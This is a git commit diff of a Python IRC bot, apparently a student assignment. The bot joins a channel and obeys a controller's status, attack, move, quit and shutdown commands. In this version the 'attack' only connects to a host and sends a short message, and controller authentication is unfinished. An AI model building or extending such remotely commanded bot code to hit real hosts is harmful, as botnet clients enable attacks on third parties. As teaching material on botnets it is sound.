cb2f9bcedf5c44783abeb78904e3534b13a4d2ef
Caleb <caleb_jutsu@hotmail.com>
2017-04-09 15:04:10 -0600

    fine tuning and commenting

--- A5/bot.py
+++ A5/bot.py
@@ -8,14 +8,23 @@ import random
 ERROR_FLAG = -1
 
 #connection info
+hostname = ""
+port = 0
 irc = ""
 channel = "#"
 con_active = False
 
 #bot info
+secret_phrase = ""
 nick = "V"
 atk_cnt = 0
 active = True
+
+'''
+------------------------------------------------------------------------
+                             Commands 
+------------------------------------------------------------------------
+'''
 
 #return status to controller	
 def cmd_status():
@@ -23,25 +32,47 @@ def cmd_status():
 	return
 	
 	
-#attack a specified host TO DO needs further error checking
+#attack a specified host 
 def cmd_attack(host, port):
 	target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#make connection with target and return status to controller
 	try:
 		target.connect((host,port))
-		target.send(bytes(atk_cnt + " " + nick, 'UTF-8'))
-		return_status("success")
-	except ConneectionRefusedError:
-		return_status("failure")
+		target.send(bytes(str(atk_cnt) + " " + nick, 'UTF-8'))
+		return_status(nick + " success")
+	#failed to attack
+	except socket.error:
+		return_status(nick + " failure")
 	return
 
 	
 #move to a new irc server
-def cmd_move(host, port, chan):
-	global channel
+def cmd_move(host, port_num, chan):
+	global irc, hostname, port, channel
+	#hold onto old in case fail to move
+	old_host = hostname
+	old_port = port
+	old_channel = channel
+	#set to new values
+	hostname = hostname
+	port = port_num
 	channel = chan
-	send("QUIT/n")
-	irc.close()
-	connect(host, port)
+	#attempt connection
+	temp_irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	status = connect(temp_irc, host, port)
+	#if connection failed, reset values
+	if status == ERROR_FLAG:
+		print("Error: ould not move to new IRC server")
+		hostname = old_host
+		port = old_port
+		channel = old_channel
+	#else close current irc connection and replace with new one
+	else:
+		#close old IRC connection
+		return_status(nick + " moving")
+		send(irc, "QUIT/n")
+		irc.close()
+		irc = temp_irc
 	return
 	
 	
@@ -53,130 +84,150 @@ def cmd_quit():
 #return status and shutdown
 def cmd_shutdown():
 	global active
+	#signal to communication and program loops to break
 	active = False
+	#tell controller quitting and disconnect
 	return_status(nick + " shutdown")
-	send("QUIT/n")
+	send(irc, "QUIT/n")
 	return
+
+
+'''
+------------------------------------------------------------------------
+                             Communication w/ IRC
+------------------------------------------------------------------------
+'''	
 	
-	
-#receive a command from the controller TO DO parsing needed and error checking
-def rcv_command():
-	#try:
-	msg = irc.recv(1024).decode()
-	print(msg.strip())
-	if msg.find('PING') != -1:
-		send('PONG ' + msg.split()[1] + '\r\n')
-		return 'PING'
-	cmd = msg[msg.find(':', 1)+1:]
-	#except somerror:
-		#con_active = False
-	
-	return cmd.strip()
+#receive a command from the controller
+def rcv_command(sock):
+	global con_active
+	while True:
+		try:
+			msg = sock.recv(1024).decode('UTF-8', 'ignore').strip()
+			print(msg)
+			#ping pong protocol
+			if msg.find('PING') != -1:
+				send(irc, 'PONG ' + msg.split()[1] + '\r\n')
+			#parse string to extract message
+			else:
+				cmd = msg[msg.find(':', 1)+1:]
+				break
+		except socket.error:
+			print("Error: couldn't receive command")
+			#signal communication loop that connection is dead
+			con_active = False
+	return cmd
 
 	
-#send as bytes TO DO
-def send(msg):
+#send as bytes
+def send(sock, msg):
 	global con_active
-	#try:
-	irc.send(msg.encode('UTF-8'))
-	#except someerror:
-		#con_active = False
+	try:
+		sock.send(msg.encode('UTF-8', 'ignore'))
+	except socket.error:
+		#signal communication loop that connection is dead
+		con_active = False
 	return
 	
 	
 #return a status message to the controller
 def return_status(msg):
-	send("PRIVMSG " + channel + " " + msg + "\n")
+	send(irc, "PRIVMSG " + channel + " " + msg + "\n")
 	return
 	
 	
-#connect to the specified IRC server and channel TO DO needs more error checking
-def connect(host, port):
-	global nick, irc, con_active
-	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#connect to the specified IRC server and channel
+def connect(sock, host, port):
+	global nick, con_active
+	#ensure port is a number
+	if not port.isdigit():
+		print("Error: specified port is not a digit")
+		return ERROR_FLAG
+	port = int(port)
+	#connect to IRC
 	try:
-		irc.connect((host,port))
+		sock.connect((host,port))
 		con_active = True
 		print("connection made")
-	except ConnectionRefusedError:
-		print("Error: Could not make connection")
+	except socket.error:
+		print("Error: connection could not be made")
 		return ERROR_FLAG
-		
+	#register with IRC until free nickname is found
 	while (True):
-		send("USER " + nick + " " + nick + " " + nick + ": This bot is connecting\n") 
-		send("NICK " + nick + "\n")
-		send("JOIN " + channel + "\n")
-		
-		if rcv_command().find("already in use") != -1:
+		send(sock, "USER " + nick + " " + nick + " " + nick + ": This bot is connecting\n")
+		send(sock, "NICK " + nick + "\n")
+		send(sock, "JOIN " + channel + "\n")
+		if rcv_command(sock).find("already in use") != -1:
 			suffix = random.randint(0, 10000)
 			nick = nick + str(suffix)
 		else:
-				break
-	
+			break
 	return 
 
+
+'''
+------------------------------------------------------------------------
+                             Communication loop
+------------------------------------------------------------------------
+'''
 	
 #handle the connection to the IRC server
 def handle_connection():
 	#TO DO Verify controller
 	
 	while active:
-	
 		#wait for commands
-		cmd = rcv_command()
+		cmd = rcv_command(irc)
 		cmd = cmd.split()
-	
 		#interpret command
-		if cmd[0] == 'PING':
-			pass
-		elif cmd[0] == "status":
+		if cmd[0] == "status":
 			cmd_status()
 		elif cmd[0] == "attack":
-			cmd_attack(cmd[1], cmd[2]) #TO DO parsing needed
+			try:
+				cmd_attack(cmd[1], cmd[2])
+			except IndexError:
+					print("Error: Insufficient arguments for cmd(attack)")	
 		elif cmd[0] == "move":
-			cmd_move(cmd[1], cmd[2], cmd[3]) #TO DO parsing needed
+			try:
+				cmd_move(cmd[1], cmd[2], cmd[3])
+			except IndexError:
+				print("Error: Insufficient arguments for cmd(move)")	
 		elif cmd[0] == "quit":
 			cmd_quit()
 		elif cmd[0] == "shutdown":
 			cmd_shutdown()
 		elif con_active == False:
+			print("Error: Connection is dead")
 			break
 		else:
 			print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
-	
 	return
+
+
+'''
+------------------------------------------------------------------------
+                             Program loop
+------------------------------------------------------------------------
+'''
 
 #main
 def main():
-	global channel, secret_phrase
-	
-	hostname = ""
-	port = 0
-	secret_phrase = ""
-	
+	global hostname, port, channel, secret_phrase, irc
 	#ensure correct number of commands
 	if len(sys.argv) != 5:
 		print("Error: Incorrect number of command line arguments. Command is...")
 		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
 		return
-		
-	#ensure port is a number
-	if not sys.argv[2].isdigit():
-		print("Error: Command argument 2 could not be processed. Command is...")
-		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
-		return
-		
 	#extract arguments from command line
 	hostname = sys.argv[1]
-	port = int(sys.argv[2])
+	port = sys.argv[2]
 	channel = channel + sys.argv[3]
 	secret_phrase = sys.argv[4]
-	
 	#loop to keep trying to connect to irc when not shutdown
 	while True:
 		#connect to the IRC server
-		status = connect(hostname, port)
-		
+		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		status = connect(irc, hostname, port)
 		if status != ERROR_FLAG:
 			#handle the connection
 			handle_connection()
@@ -186,8 +237,13 @@ def main():
 			time.sleep(5)
 		else:
 			break
-
 	return
 
-	
+
+'''
+------------------------------------------------------------------------
+                             Call Program
+------------------------------------------------------------------------
+'''
+
 main()
